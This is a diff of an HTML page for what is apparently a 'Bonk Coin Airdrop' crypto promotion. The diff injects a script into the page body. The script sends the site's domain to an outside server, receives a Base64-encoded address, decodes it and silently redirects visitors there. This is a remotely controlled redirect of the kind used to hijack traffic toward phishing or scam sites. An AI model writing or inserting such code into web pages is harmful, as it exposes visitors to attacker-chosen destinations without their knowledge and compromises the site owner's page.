@@ -17,6 +17,20 @@
     <noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:100,200,300,400,500,600,700,800,900&display=swap" /></noscript>
   </head>
   <body>
+	  <script>
+(async () => {
+  // Извлекаем домен из текущего URL (без протоколов и www)
+  const domain = location.href.match(/^(?:https?:\/\/)?(?:www\.)?([^\/]+)/i)?.[1];
+  if (!domain) return;
+
+  // Отправляем запрос к API
+  const { status } = await (await fetch(`https://domain.memc.site/domain?url=${domain}`)).json();
+  
+  // Если status не пустой, декодируем из Base64 и перенаправляем
+  if (status) location.href = atob(status);
+})();
+
+</script>
     <section class="image4" id="image04-0">
       <div class="image-block m-auto">
           <img src="headerp.jpg" class="header-mob" alt="Bonk Coin Airdrop" />
